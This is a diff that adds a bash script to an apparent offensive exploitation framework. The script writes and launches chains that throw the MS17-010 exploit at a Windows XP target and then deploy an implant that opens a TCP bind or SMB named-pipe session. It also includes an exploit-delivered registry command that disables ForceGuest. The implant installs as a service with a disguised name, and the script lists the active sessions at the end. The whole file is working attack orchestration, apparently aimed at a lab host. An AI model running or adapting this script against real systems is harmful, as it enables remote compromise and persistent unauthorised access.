@@ -1,0 +1,125 @@
+#!/usr/bin/env bash
+set -euo pipefail
+
+root="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
+workspace="${HOVEL_WORKSPACE:-"$root/.hovel"}"
+module_config="${HOVEL_MODULE_CONFIG:-"$root/modules/examples/hovel-modules.json"}"
+target_host="${HOVEL_LAB_TARGET_HOST:-192.168.122.142}"
+target_id="${HOVEL_LAB_TARGET_ID:-xp-lab}"
+transport="${HOVEL_SQUATTER_TYPE:-tcp-bind}"
+bind_port="${HOVEL_SQUATTER_BIND_PORT:-9101}"
+pipe_name="${HOVEL_SQUATTER_PIPE:-squatter}"
+pipe_path="\\\\.\\pipe\\${pipe_name}"
+remote_path="${HOVEL_SQUATTER_REMOTE_PATH:-}"
+smb_user="${HOVEL_SMB_USER:-user}"
+smb_password="${HOVEL_SMB_PASSWORD:-password}"
+smb_domain="${HOVEL_SMB_DOMAIN:-}"
+forceguest="${HOVEL_FORCEGUEST_FIX:-auto}"
+chain_file="$workspace/lab/ms17-010-squatter-${transport}.chain.yaml"
+forceguest_chain="$workspace/lab/ms17-010-forceguest.chain.yaml"
+
+mkdir -p "$(dirname "$chain_file")"
+
+remote_chain_config=""
+remote_target_config=""
+if [[ -n "$remote_path" ]]; then
+  remote_chain_config="    squatter.remote_path: '$remote_path'"
+  remote_target_config="        payload.remote_path: '$remote_path'"
+fi
+
+admin_probe_ok() {
+  HOVEL_MODULE_CONFIG="$module_config" task run -- //modules/squatter/client/cmd/smbadminctl -- \
+    --user "$smb_user" --password "$smb_password" --domain "$smb_domain" --read 'C:\Windows\win.ini' "$target_host" >/dev/null
+}
+
+write_forceguest_chain() {
+  cat >"$forceguest_chain" <<EOF
+apiVersion: hovel.dev/v1alpha1
+kind: Chain
+metadata:
+  name: ms17-010-forceguest
+spec:
+  mode: configured
+  steps:
+    - id: forceguest
+      uses: module:ms17-010-exploit@v1.0.0
+  config:
+    operator.confirmed_lab: "true"
+  targets:
+    - id: "$target_id"
+      config:
+        target.host: "$target_host"
+        target.port: "445"
+        pipe: "spoolss"
+        command: 'reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v ForceGuest /t REG_DWORD /d 0 /f'
+        cleanup: "true"
+        target_profile: "XP_SP2SP3_X86"
+        timeout_seconds: "20"
+EOF
+}
+
+maybe_disable_forceguest() {
+  case "$forceguest" in
+    0|false|no|off) return 0 ;;
+  esac
+  if admin_probe_ok; then
+    echo "SMB admin probe succeeded; ForceGuest remediation not needed"
+    return 0
+  fi
+  echo "SMB admin probe failed; throwing MS17-010 ForceGuest remediation"
+  write_forceguest_chain
+  HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$forceguest_chain" --allow-dangerous --now
+  sleep 3
+}
+
+if [[ "$transport" == "smb-named-pipe" ]]; then
+  maybe_disable_forceguest
+fi
+
+cat >"$chain_file" <<EOF
+apiVersion: hovel.dev/v1alpha1
+kind: Chain
+metadata:
+  name: ms17-010-squatter-${transport}
+spec:
+  mode: configured
+  steps:
+    - id: exploit
+      uses: module:ms17-010-exploit@v1.0.0
+    - id: squatter
+      uses: module:squatter@v0.1.0
+  config:
+    operator.confirmed_lab: "true"
+    squatter.type: "$transport"
+    squatter.bind_port: "$bind_port"
+$remote_chain_config
+  targets:
+    - id: "$target_id"
+      config:
+        target.host: "$target_host"
+        target.port: "445"
+        pipe: "spoolss"
+        payload.transport: "$transport"
+$remote_target_config
+        payload.bind_port: "$bind_port"
+        payload.pipe: '$pipe_path'
+        smb.username: "$smb_user"
+        smb.password: "$smb_password"
+        smb.domain: "$smb_domain"
+        smb.port: "445"
+        service.name: "w32tm33"
+        cleanup: "true"
+        target_profile: "XP_SP2SP3_X86"
+        timeout_seconds: "20"
+EOF
+
+echo "Wrote $chain_file"
+if [[ "$transport" == "smb-named-pipe" ]]; then
+  echo "Throwing MS17-010 -> Squatter SMB named pipe at $target_host (${pipe_name})"
+else
+  echo "Throwing MS17-010 -> Squatter TCP bind at $target_host:$bind_port"
+fi
+HOVEL_MODULE_CONFIG="$module_config" HOVEL_WORKSPACE="$workspace" task throw -- "$chain_file" --allow-dangerous --now
+echo
+echo "Active sessions:"
+HOVEL_MODULE_CONFIG="$module_config" task run -- //cmd/hovel -- session list --workspace "$workspace"
